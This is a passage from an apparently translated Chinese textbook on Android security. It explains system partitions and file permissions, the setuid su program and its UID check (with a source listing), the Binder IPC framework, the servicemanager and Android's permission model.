\u76ee\u5f55\u5305\u542b\u5df2\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6240\u6709 apk \u6587 \u4ef6\uff0c\u800c /data/data \u6587\u4ef6\u5939\u5305\u542b\u5e94\u7528\u7a0b\u5e8f\u7684 home \u76ee\u5f55\u3002 /cache \u5206\u533a\u8d1f\u8d23\u5b58\u50a8\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u548c\u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6\u3002 \u6b64\u5916\uff0c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u7ebf\u66f4\u65b0\uff08\u5361\u5237\uff09\u4e5f \u5728\u8fd0\u884c\u4e4b\u524d\u5b58\u50a8\u5728\u6b64\u5206\u533a\u4e0a\u3002 \u56e0\u6b64\uff0c\u5728 Android \u7684\u7f16\u8bd1\u671f\u95f4\u751f\u6210 /system \uff0c /data \u548c /cache \uff0c\u8fd9\u4e9b\u6620\u50cf\u4e0a\u5305\u542b\u7684\u6587\u4ef6\u548c\u6587 \u4ef6\u5939\u7684\u9ed8\u8ba4\u6743\u9650\u548c\u6240\u6709\u8005\u5fc5\u987b\u5728\u7f16\u8bd1\u65f6\u5b9a\u4e49\u3002 \u8fd9\u610f\u5473\u7740\u5728\u7f16\u8bd1\u6b64\u64cd\u4f5c\u7cfb\u7edf\u671f\u95f4\uff0c\u7528\u6237\u548c\u7ec4 UID \u548c GID \u5e94\u8be5\u53ef\u7528\u3002 Android \u6587\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\uff08\u89c1\u6e05\u5355 3.5\uff09\u5305\u542b\u9884\u5b9a\u4e49\u7684\u7528\u6237\u548c\u7ec4\u7684 \u5217\u8868\u3002 \u5e94\u8be5\u63d0\u5230\u7684\u662f\uff0c\u4e00\u4e9b\u884c\u4e2d\u7684\u503c\uff08\u4f8b\u5982\uff0c\u53c2\u89c1\u7b2c 10 \u884c\uff09\u5bf9\u5e94\u4e8e\u5728 Linux \u5185\u6838\u5c42\u4e0a\u5b9a\u4e49\u7684 \u503c\uff0c\u5982\u7b2c 2.2 \u8282\u6240\u8ff0\u3002 \u6b64\u5916\uff0c\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u9ed8\u8ba4\u6743\u9650\uff0c\u6240\u6709\u8005\u548c\u6240\u6709\u8005\u7ec4\u5b9a\u4e49\u5728\u8be5\u6587\u4ef6\u4e2d\uff08\u89c1\u6e05\u5355 3.6\uff09\u3002 \u8fd9\u4e9b \u89c4\u5219\u7531 fs_config() \u51fd\u6570\u89e3\u6790\u5e76\u5e94\u7528\uff0c\u5b83\u5728\u8fd9\u4e2a\u6587\u4ef6\u7684\u672b\u5c3e\u5b9a\u4e49\u3002 \u6b64\u51fd\u6570\u5728\u6620\u50cf\u7ec4\u88c5\u671f\u95f4\u8c03 \u7528\u3002 3.2.1 \u672c\u5730\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4fdd\u62a4 \u00b6 \u5728\u6e05\u5355 3.6 \u4e2d\u53ef\u4ee5\u770b\u5230\u4e00\u4e9b\u4e8c\u8fdb\u5236\u6587\u4ef6\u5206\u914d\u6709 setuid \u548c setgid \u8bbf\u95ee\u6743\u9650\u6807\u5fd7\u3002\u4f8b\u5982\uff0c su \u7a0b \u5e8f\u8bbe\u7f6e\u4e86\u5b83\u4eec\u3002\u8fd9\u4e2a\u4f17\u6240\u5468\u77e5\u7684\u5de5\u5177\u5141\u8bb8\u7528\u6237\u8fd0\u884c\u5177\u6709\u6307\u5b9a\u7684 UID \u548c GID \u7684\u7a0b\u5e8f\u3002\u5728 Linux \u4e2d\uff0c\u6b64\u529f\u80fd\u901a\u5e38\u7528\u4e8e\u8fd0\u884c\u5177\u6709\u8d85\u7ea7\u7528\u6237\u6743\u9650\u7684\u7a0b\u5e8f\u3002\u6839\u636e\u5217\u8868 3.6\uff0c\u4e8c\u8fdb \u5236 /system/xbin/su \u7684\u8bbf\u95ee\u6743\u9650\u5206\u914d\u4e3a\u201c06755\"\uff08\u89c1\u7b2c 21 \u884c\uff09\u3002\u7b2c\u4e00\u4e2a\u975e\u96f6\u6570\u201c6\"\u610f\u5473\u7740\u8be5\u4e8c \u8fdb\u5236\u5177\u6709 setuid \u548c setgid \uff08 4 + 2 \uff09\u8bbf\u95ee\u6743\u9650\u6807\u5fd7\u96c6\u3002\u901a\u5e38\uff0c\u5728Linux\u4e2d\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u4e0e \u542f\u52a8\u5b83\u7684\u8fdb\u7a0b\u76f8\u540c\u7684\u6743\u9650\u8fd0\u884c\u3002\u8fd9\u4e9b\u6807\u7b7e\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u53ef\u6267\u884c\u6240\u6709\u8005\u6216\u7ec4\u7684\u6743\u9650\u8fd0\u884c\u7a0b\u5e8f [11]\u3002\u56e0\u6b64\uff0c\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\uff0c binary/system/xbin/su \u5c06\u4ee5 root \u7528\u6237\u8eab\u4efd\u8fd0\u884c\u3002\u8fd9\u4e9b root \u6743 \u9650\u5141\u8bb8\u7a0b\u5e8f\u5c06\u5176 UID \u548c GID \u66f4\u6539\u4e3a\u7528\u6237\u6307\u5b9a\u7684 UID \u548c GID\uff08\u89c1\u6e05\u5355 3.7 \u4e2d\u7684\u7b2c 15 \u884c\uff09\u3002\u4e4b \u540e\uff0c su \u53ef\u4ee5\u4f7f\u7528\u6307\u5b9a\u7684 UID \u548c GID \u542f\u52a8\u63d0\u4f9b\u7684\u7a0b\u5e8f\uff08\u4f8b\u5982\uff0c\u53c2\u89c1\u884c 22\uff09\u3002\u56e0\u6b64\uff0c\u7a0b\u5e8f\u5c06\u4ee5 \u6240\u9700\u7684 UID \u548c GID \u542f\u52a8\u3002 \u5728\u7279\u6743\u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u9650\u5236\u53ef\u8bbf\u95ee\u8fd9\u4e9b\u5de5\u5177\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u8303\u56f4\u3002 \u5728\u6211\u4eec\u7684\u8fd9\u91cc\uff0c\u6ca1\u6709\u8fd9 \u6837\u7684\u9650\u5236\uff0c\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u8fd0\u884c su \u7a0b\u5e8f\u5e76\u83b7\u5f97 root \u7ea7\u522b\u7684\u6743\u9650\u3002 \u5728 Android \u4e2d\uff0c\u901a\u8fc7\u5c06 \u8c03\u7528\u7a0b\u5e8f\u7684 UID \u4e0e\u5141\u8bb8\u8fd0\u884c\u5b83\u7684 UID \u5217\u8868\u8fdb\u884c\u6bd4\u8f83\uff0c\u6765\u5bf9\u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42\u5b9e\u73b0\u8fd9\u79cd\u9650\u5236\u3002 \u56e0 \u6b64\uff0c\u5728\u7b2c 9 \u884c\u4e2d\uff0c su \u53ef\u6267\u884c\u6587\u4ef6\u83b7\u5f97\u8fdb\u7a0b\u7684\u5f53\u524d UID\uff0c\u5b83\u7b49\u4e8e\u8c03\u7528\u5b83\u7684\u8fdb\u7a0b\u7684 UID\uff0c\u5728 \u7b2c 10 \u884c\uff0c\u5b83\u5c06\u8fd9\u4e2a UID \u4e0e\u5141\u8bb8\u7684 UID \u7684\u9884\u5b9a\u5217\u8868\u8fdb\u884c\u6bd4\u8f83\u3002 \u56e0\u6b64\uff0c\u53ea\u6709\u5728\u8c03\u7528\u8fdb\u7a0b\u7684 UID \u7b49\u4e8e AID_ROOT \u6216 AID_SHELL \u65f6\uff0c su \u5de5\u5177\u624d\u4f1a\u542f\u52a8\u3002 \u4e3a\u4e86\u6267\u884c\u8fd9\u6837\u7684\u68c0\u67e5\uff0c su \u5bfc\u5165\u5728 Android \u4e2d\u5b9a\u4e49\u7684 UID \u5e38\u91cf \u6b64\u5916\uff0c\u5728\u8f83\u65b0\u7684\u7248\u672c\uff08\u4ece 4.3 \u5f00\u59cb\uff09\uff0cAndroid \u6838\u5fc3\u5f00\u53d1\u4eba\u5458\u5f00\u59cb\u4f7f\u7528 Capabilities Linux \u5185 \u6838\u7cfb\u7edf[4]\u3002 \u8fd9\u5141\u8bb8\u5b83\u4eec\u989d\u5916\u9650\u5236\u9700\u8981\u4ee5 root \u6743\u9650\u8fd0\u884c\u7684\u7a0b\u5e8f\u7684\u6743\u9650\u3002 \u4f8b\u5982\uff0c\u5bf9\u4e8e su \u7a0b\u5e8f\u6765 \u8bf4\uff0c\u5b83\u4e0d\u9700\u8981\u5177\u6709 root \u7528\u6237\u7684\u6240\u6709\u7279\u6743\u3002 \u5bf9\u4e8e\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u5b83\u8db3\u4ee5\u6709\u80fd\u529b\u4fee\u6539\u5f53\u524d\u7684 UID \u548c GID\u3002 \u56e0\u6b64\uff0c\u6b64\u5de5\u5177\u53ea\u9700\u8981 CAP_SETUID \u548c CAP_SETGID root \u6743\u9650\u6765\u6b63\u5e38\u8fd0\u884c\u3002 1 # include < private / android_filesystem_config . h > 2 ... 3 int main ( int argc , char ** argv ) 4 { 5 struct passwd * pw ; 6 int uid , gid , myuid ; 7 8 /* Until we have something better , only root and the shell can use su . */ 9 myuid = getuid () ; 10 if ( myuid != AID_ROOT && myuid != AID_SHELL ) { 11 fprintf ( stderr , \"su : uid %d not allowed to su \\n \" , myuid ) ; 12 return 1 ; 13 } 14 ... 15 if ( setgid ( gid ) || setuid ( uid ) ) { 16 fprintf ( stderr , \"su : permission denied \\n \" ) ; 17 return 1 ; 18 } 19 20 /* User specified command for exec . */ 21 if ( argc == 3 ) { 22 if ( execlp ( argv [ 2 ], argv [ 2 ], NULL ) < 0 ) { 23 fprintf ( stderr , \"su : exec failed for %s Error:%s \\n \" , argv [ 2 ] , 24 strerror ( errno ) ) ; 25 return \u2212 errno ; 26 } 27 ... 28 } su \u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801 \u7b2c\u56db\u7ae0 Android \u6846\u67b6\u5c42\u5b89\u5168 \u00b6 4.1 Android Binder \u6846\u67b6 \u00b6 \u5982 2.1 \u8282\u6240\u8ff0\uff0c\u6240\u6709 Android \u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u5e94\u7528\u7a0b\u5e8f\u6c99\u7bb1\u4e2d\u8fd0\u884c\u3002\u7c97\u7565\u5730\u8bf4\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u6c99\u7bb1\u901a\u8fc7\u5728\u5e26\u6709\u4e0d\u540c Linux \u8eab\u4efd\u7684\u4e0d\u540c\u8fdb\u7a0b\u4e2d\u8fd0\u884c\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u6765\u4fdd\u8bc1\u3002\u6b64\u5916\uff0c\u7cfb\u7edf\u670d\u52a1\u4e5f\u5728\u5177\u6709\u66f4\u591a\u7279\u6743\u8eab\u4efd\u7684\u5355\u72ec\u8fdb\u7a0b\u4e2d\u8fd0\u884c\uff0c\u5141\u8bb8\u5b83\u4eec\u4f7f\u7528 Linux Kernel DAC \u529f\u80fd\uff0c\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7cfb\u7edf\u4e0d\u540c\u90e8\u5206\uff08\u53c2\u89c1\u7b2c 2.1, 2.2 \u548c 1.2 \u8282\uff09\u3002\u56e0\u6b64\uff0c\u9700\u8981\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\u6846\u67b6\u6765\u7ba1\u7406\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u7684\u6570\u636e\u548c\u4fe1\u53f7\u4ea4\u6362\u3002\u5728 Android \u4e2d\uff0c\u4e00\u4e2a\u79f0\u4e3a Binder \u7684\u7279\u6b8a\u6846\u67b6\u7528\u4e8e\u8fdb\u7a0b\u95f4\u901a\u4fe1 [12]\u3002\u6807\u51c6\u7684 Posix System V IPC \u6846\u67b6\u4e0d\u652f\u6301\u7531 Android \u5b9e\u73b0\u7684 Bionic libc \u5e93\uff08\u53c2\u89c1\u8fd9\u91cc\uff09\u3002\u6b64\u5916\uff0c\u9664\u4e86\u7528\u4e8e\u4e00\u4e9b\u7279\u6b8a\u60c5\u51b5\u7684 Binder \u6846\u67b6\uff0c\u4e5f\u4f1a\u4f7f\u7528 Unix \u57df\u5957\u63a5\u5b57\uff08\u4f8b\u5982\uff0c\u7528\u4e8e\u4e0e Zygote \u5b88\u62a4\u8fdb\u7a0b\u7684\u901a\u4fe1\uff09\uff0c\u4f46\u662f\u8fd9\u4e9b\u673a\u5236\u4e0d\u5728\u672c\u6587\u7684\u8003\u8651\u8303\u56f4\u4e4b\u5185\u3002 Binder \u6846\u67b6\u88ab\u7279\u5730\u91cd\u65b0\u5f00\u53d1\u6765\u5728 Android \u4e2d\u4f7f\u7528\u3002 \u5b83\u63d0\u4f9b\u4e86\u7ba1\u7406\u6b64\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u8fdb\u7a0b\u4e4b\u95f4\u7684\u6240\u6709\u7c7b\u578b\u7684\u901a\u4fe1\u6240\u9700\u7684\u529f\u80fd\u3002 \u57fa\u672c\u4e0a\uff0c\u751a\u81f3\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u719f\u77e5\u7684\u673a\u5236\uff0c\u4f8b\u5982 Intents \u548c ContentProvider \uff0c\u90fd\u5efa\u7acb\u5728 Binder \u6846\u67b6\u4e4b\u4e0a\u3002 \u8fd9\u4e2a\u6846\u67b6\u63d0\u4f9b\u4e86\u591a\u79cd\u529f\u80fd\uff0c\u4f8b\u5982\u53ef\u4ee5\u8c03\u7528\u8fdc\u7a0b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\uff0c\u5c31\u50cf\u672c\u5730\u5bf9\u8c61\u90a3\u6837\uff0c\u4ee5\u53ca\u540c\u6b65\u548c\u5f02\u6b65\u65b9\u6cd5\u8c03\u7528\uff0cLink to Death\uff08\u67d0\u4e2a\u8fdb\u7a0b\u7684 Binder \u7ec8\u6b62\u65f6\u7684\u81ea\u52a8\u901a\u77e5\uff09\uff0c\u8de8\u8fdb\u7a0b\u53d1\u9001\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u80fd\u529b\u7b49\u7b49[12,16]\u3002 \u6839\u636e\u7531\u5ba2\u6237\u7aef - \u670d\u52a1\u5668\u540c\u6b65\u6a21\u578b\u7ec4\u7ec7\u7684\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u5ba2\u6237\u7aef\u53d1\u8d77\u8fde\u63a5\u5e76\u7b49\u5f85\u6765\u81ea\u670d\u52a1\u7aef\u7684\u56de\u590d\u3002 \u56e0\u6b64\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u53ef\u4ee5\u88ab\u60f3\u8c61\u4e3a\u5728\u76f8\u540c\u7684\u8fdb\u7a0b\u7ebf\u7a0b\u4e2d\u6267\u884c\u3002 \u8fd9\u4e3a\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u4e86\u8c03\u7528\u8fdc\u7a0b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\u7684\u53ef\u80fd\u6027\uff0c\u5c31\u50cf\u5b83\u4eec\u662f\u672c\u5730\u7684\u4e00\u6837\u3002 \u901a\u8fc7 Binder \u7684\u901a\u4fe1\u6a21\u578b\u5982\u56fe 4.1 \u6240\u793a\u3002 \u5728\u8fd9\u4e2a\u56fe\u4e2d\uff0c\u5ba2\u6237\u7aef\u8fdb\u7a0b A \u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u60f3\u8981\u4f7f\u7528\u8fdb\u7a0b B [12]\u4e2d\u8fd0\u884c\u7684\u670d\u52a1\u7684\u516c\u5f00\u884c\u4e3a \u4f7f\u7528 Binder \u6846\u67b6\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u4e4b\u95f4\u7684\u6240\u6709\u901a\u4fe1\uff0c\u90fd\u901a\u8fc7 Linux \u5185\u6838\u9a71\u52a8\u7a0b\u5e8f /dev/binder \u8fdb\u884c\u3002\u6b64\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u7684\u6743\u9650\u8bbe\u7f6e\u4e3a\u5168\u5c40\u53ef\u8bfb\u548c\u53ef\u5199\uff08\u89c1 3.1 \u8282\u4e2d\u7684\u6e05\u5355 3.3\u4e2d\u7684\u7b2c 3 \u884c\uff09\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5199\u5165\u548c\u8bfb\u53d6\u6b64\u8bbe\u5907\u3002\u4e3a\u4e86\u9690\u85cf Binder \u901a\u4fe1\u534f\u8bae\u7684\u7279\u6027\uff0c libbinder \u5e93\u5728 Android \u4e2d\u4f7f\u7528\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u529f\u80fd\uff0c\u4f7f\u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u7684\u4ea4\u4e92\u8fc7\u7a0b\u5bf9\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u900f\u660e\u3002\u5c24\u5176\u662f\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u6240\u6709\u901a\u4fe1\u901a\u8fc7\u5ba2\u6237\u7aef\u4fa7\u7684\u4ee3\u7406\u548c\u670d\u52a1\u5668\u4fa7\u7684\u6869\u8fdb\u884c\u3002\u4ee3\u7406\u548c\u6869\u8d1f\u8d23\u7f16\u7801\u548c\u89e3\u7801\u6570\u636e\u548c\u901a\u8fc7 Binder \u9a71\u52a8\u7a0b\u5e8f\u53d1\u9001\u7684\u547d\u4ee4\u3002\u4e3a\u4e86\u4f7f\u7528\u4ee3\u7406\u548c\u6869\uff0c\u5f00\u53d1\u4eba\u5458\u53ea\u9700\u5b9a\u4e49\u4e00\u4e2a AIDL \u63a5\u53e3\uff0c\u5728\u7f16\u8bd1\u5e94\u7528\u7a0b\u5e8f\u671f\u95f4\u5c06\u5176\u8f6c\u6362\u4e3a\u4ee3\u7406\u548c\u6869\u3002\u5728\u670d\u52a1\u7aef\uff0c\u8c03\u7528\u5355\u72ec\u7684 Binder \u7ebf\u7a0b\u6765\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u3002 \u4ece\u6280\u672f\u4e0a\u8bb2\uff0c\u4f7f\u7528Binder\u673a\u5236\u7684\u6bcf\u4e2a\u516c\u5f00\u670d\u52a1\uff08\u6709\u65f6\u79f0\u4e3a Binder \u670d\u52a1\uff09\u90fd\u5206\u914d\u6709\u6807\u8bc6\u3002\u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u786e\u4fdd\u6b64 32 \u4f4d\u503c\u5728\u7cfb\u7edf\u4e2d\u7684\u6240\u6709\u8fdb\u7a0b\u4e2d\u662f\u552f\u4e00\u7684\u3002\u56e0\u6b64\uff0c\u6b64\u6807\u8bc6\u7528\u4f5c Binder \u670d\u52a1\u7684\u53e5\u67c4\u3002\u62e5\u6709\u6b64\u53e5\u67c4\u53ef\u4ee5\u4e0e\u670d\u52a1\u4ea4\u4e92\u3002\u7136\u800c\uff0c\u4e3a\u4e86\u5f00\u59cb\u4f7f\u7528\u670d\u52a1\uff0c\u5ba2\u6237\u7aef\u9996\u5148\u5fc5\u987b\u627e\u5230\u8fd9\u4e2a\u503c\u3002\u670d\u52a1\u53e5\u67c4\u7684\u53d1\u73b0\u901a\u8fc7 Binder \u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff08 servicemanager \u662f Android Binder \u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u7684\u5b9e\u73b0\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u4e92\u6362\u4f7f\u7528\u8fd9\u4e9b\u6982\u5ff5\uff09\u6765\u5b8c\u6210\u3002\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u662f\u4e00\u4e2a\u7279\u6b8a\u7684Binder \u670d\u52a1\uff0c\u5176\u9884\u5b9a\u4e49\u7684\u53e5\u67c4\u503c\u7b49\u4e8e 0\uff08\u6307\u4ee3\u6e05\u5355 4.1 \u7684\u7b2c 8 \u884c\u4e2d\u83b7\u5f97\u7684\u4e1c\u897f\uff09\u3002\u56e0\u4e3a\u5b83\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u53e5\u67c4\u503c\uff0c\u4efb\u4f55\u4e00\u65b9\u90fd\u53ef\u4ee5\u627e\u5230\u5b83\u5e76\u8c03\u7528\u5176\u65b9\u6cd5\u3002\u57fa\u672c\u4e0a\uff0c\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u5145\u5f53\u540d\u79f0\u670d\u52a1\uff0c\u901a\u8fc7\u670d\u52a1\u7684\u540d\u79f0\u63d0\u4f9b\u670d\u52a1\u53e5\u67c4\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\uff0c\u6bcf\u4e2a\u670d\u52a1\u5fc5\u987b\u6ce8\u518c\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff08\u4f8b\u5982\uff0c\u4f7f\u7528\u7b2c 26 \u884c\u4e2d\u7684 ServiceManager \u7c7b\u7684 addService \u65b9\u6cd5\uff09\u3002\u56e0\u6b64\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u4ec5\u77e5\u9053\u4e0e\u5176\u901a\u4fe1\u7684\u670d\u52a1\u540d\u79f0\u3002\u4f7f\u7528\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u6765\u89e3\u6790\u6b64\u540d\u79f0\uff08\u8bf7\u53c2\u9605 getService \u7b2c 12 \u884c\uff09\uff0c\u5ba2\u6237\u7aef\u5c06\u6536\u5230\u7a0d\u540e\u7528\u4e8e\u4e0e\u670d\u52a1\u4ea4\u4e92\u7684\u6807\u8bc6\u3002 Binder \u9a71\u52a8\u7a0b\u5e8f\u53ea\u5141\u8bb8\u6ce8\u518c\u5355\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u3002\u56e0\u6b64\uff0c servicemanager \u662f\u7531 Android \u542f\u52a8\u7684\u7b2c\u4e00\u4e2a\u670d\u52a1\u4e4b\u4e00\uff08\u89c1\u7b2c 3.1\u8282\uff09\u3002 servicemanager \u7ec4\u4ef6\u786e\u4fdd\u4e86\u53ea\u5141\u8bb8\u7279\u6743\u7cfb\u7edf\u6807\u8bc6\u6ce8\u518c\u670d\u52a1\u3002 Binder \u6846\u67b6\u672c\u8eab\u4e0d\u5b9e\u65bd\u4efb\u4f55\u5b89\u5168\u6027\u3002 \u540c\u65f6\uff0c\u5b83\u63d0\u4f9b\u4e86\u5728 Android \u4e2d\u5b9e\u65bd\u5b89\u5168\u6027\u7684\u8bbe\u65bd\u3002Binder \u9a71\u52a8\u7a0b\u5e8f\u5c06\u53d1\u9001\u8005\u8fdb\u7a0b\u7684 UID \u548c PID \u6dfb\u52a0\u5230\u6bcf\u4e2a\u4e8b\u52a1\u3002 \u56e0\u6b64\uff0c\u7531\u4e8e\u7cfb\u7edf\u4e2d\u7684\u6bcf\u4e2a\u5e94\u7528\u5177\u6709\u5176\u81ea\u5df1\u7684 UID\uff0c\u6240\u4ee5\u8be5\u503c\u53ef\u4ee5\u7528\u4e8e\u8bc6\u522b\u8c03\u7528\u65b9\u3002 \u8c03\u7528\u7684\u63a5\u6536\u8005\u53ef\u4ee5\u68c0\u67e5\u6240\u83b7\u5f97\u7684\u503c\u5e76\u4e14\u51b3\u5b9a\u662f\u5426\u5e94\u8be5\u5b8c\u6210\u4e8b\u52a1\u3002 \u63a5\u6536\u8005\u53ef\u4ee5\u8c03\u7528android.os.Binder.getCallingUid() \u548c android.os.Binder.getCallingPid() [12]\u6765\u83b7\u5f97\u53d1\u9001\u8005\u7684 UID \u548c PID\u3002 \u53e6\u5916\uff0c\u7531\u4e8e Binder \u53e5\u67c4\u5728\u6240\u6709\u8fdb\u7a0b\u4e2d\u7684\u552f\u4e00\u6027\u548c\u5176\u503c\u7684\u6a21\u7cca\u6027[14]\uff0c\u5b83\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5b89\u5168\u6807\u8bc6 4.2 Android \u6743\u9650 \u00b6 \u5982\u6211\u4eec\u5728 2.1 \u8282\u4e2d\u6240\u8bbe\u8ba1\u7684\u90a3\u6837\uff0c\u5728 Android \u4e2d\uff0c\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u9ed8\u8ba4\u83b7\u5f97\u5176\u81ea\u5df1\u7684 UID \u548cGID \u7cfb\u7edf\u6807\u8bc6\u3002 \u6b64\u5916\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd8\u6709\u4e00\u4e9b\u786c\u7f16\u7801\u7684\u6807\u8bc6\uff08\u53c2\u89c1\u6e05\u5355 3.5\uff09\u3002 \u8fd9\u4e9b\u8eab\u4efd\u7528\u4e8e\u4f7f\u7528\u5728 Linux \u5185\u6838\u7ea7\u522b\u4e0a\u5b9e\u65bd\u7684 DAC\uff0c\u5206\u79bb Android \u64cd\u4f5c\u7cfb\u7edf\u7684\u7ec4\u4ef6\uff0c\u4ece\u800c\u63d0\u9ad8\u64cd\u4f5c\u7cfb\u7edf\u7684\u6574\u4f53\u5b89\u5168\u6027\u3002 \u5728\u8fd9\u4e9b\u8eab\u4efd\u4e2d\uff0c AID SYSTEM \u6700\u4e3a\u663e\u8457\u3002 \u6b64 UID \u7528\u4e8e\u8fd0\u884c\u7cfb\u7edf\u670d\u52a1\u5668\uff08 system server \uff09\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u7edf\u4e00\u4e86\u7531 Android \u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u670d\u52a1\u3002 \u7cfb\u7edf\u670d\u52a1\u5668\u5177\u6709\u8bbf\u95ee\u64cd\u4f5c\u7cfb\u7edf\u8d44\u6e90\uff0c\u4ee5\u53ca\u5728\u7cfb\u7edf\u670d\u52a1\u5668\u5185\u8fd0\u884c\u7684\u6bcf\u4e2a\u670d\u52a1\u7684\u7279\u6743\uff0c\u8fd9\u4e9b\u670d\u52a1\u63d0\u4f9b\u5bf9\u5176\u4ed6 OS \u7ec4\u4ef6\u548c\u5e94\u7528\u7684\u7279\u5b9a\u529f\u80fd\u7684\u53d7\u63a7\u8bbf\u95ee\u3002 \u6b64\u53d7\u63a7\u8bbf\u95ee\u57fa\u4e8e\u6743\u9650\u7cfb\u7edf\u3002 \u6b63\u5982\u6211\u4eec\u5728 4.1 \u8282\u4e2d\u6240\u63d0\u53ca\u7684\uff0cBinder \u6846\u67b6\u5411\u63a5\u6536\u65b9\u63d0\u4f9b\u4e86\u83b7\u5f97\u53d1\u9001\u65b9 UID \u548c PID \u7684\u80fd\u529b\u3002 \u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8be5\u529f\u80fd\u53ef\u4ee5\u7531\u670d\u52a1\u5229\u7528\u6765\u9650\u5236\u60f3\u8981\u8fde\u63a5\u5230\u670d\u52a1\u7684\u6d88\u8d39\u8005\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u5c06\u6d88\u8d39\u8005\u7684 UID \u548c PID \u4e0e\u670d\u52a1\u6240\u5141\u8bb8\u7684 UID \u5217\u8868\u8fdb\u884c\u6bd4\u8f83\u6765\u5b9e\u73b0\u3002\u7136\u800c\uff0c\u5728 Android \u4e2d\uff0c\u8fd9\u79cd\u529f\u80fd\u4ee5\u7565\u5fae\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u3002\u670d\u52a1\u7684\u6bcf\u4e2a\u5173\u952e\u529f\u80fd\uff08\u6216\u7b80\u5355\u6765\u8bf4\u662f\u670d\u52a1\u7684\u65b9\u6cd5\uff09\u88ab\u79f0\u4e3a\u6743\u9650\u7684\u7279\u6b8a\u6807\u7b7e\u4fdd\u62a4\u3002\u7c97\u7565\u5730\u8bf4\uff0c\u5728\u6267\u884c\u8fd9\u6837\u7684\u65b9\u6cd5\u4e4b\u524d\uff0c\u4f1a\u68c0\u67e5\u8c03\u7528\u8fdb\u7a0b\u662f\u5426\u88ab\u5206\u914d\u4e86\u6743\u9650\u3002\u5982\u679c\u8c03\u7528\u8fdb\u7a0b\u5177\u6709\u6240\u9700\u6743\u9650\uff0c\u5219\u5141\u8bb8\u8c03\u7528\u670d\u52a1\u3002\u5426\u5219\uff0c\u5c06\u629b\u51fa\u5b89\u5168\u68c0\u67e5\u5f02\u5e38\uff08\u901a\u5e38\uff0c SecurityException \uff09\u3002\u4f8b\u5982\uff0c\u5982\u679c\u5f00\u53d1\u8005\u60f3\u8981\u5411\u5176\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u53d1\u9001\u77ed\u4fe1\u7684\u529f\u80fd\uff0c\u5219\u5fc5\u987b\u5c06\u4ee5\u4e0b\u884c\u6dfb\u52a0\u5230\u5e94\u7528\u7a0b\u5e8f\u7684 AndroidManifest.xml \u6587\u4ef6 \u4e2d\uff1a \u3002Android \u8fd8\u63d0\u4f9b\u4e86\u4e00\u7ec4\u7279\u6b8a\u8c03\u7528\uff0c\u5141\u8bb8\u5728\u8fd0\u884c\u65f6\u68c0\u67e5\u670d\u52a1\u4f7f\u7528\u8005\u662f\u5426\u5df2\u5206\u914d\u6743\u9650\u3002 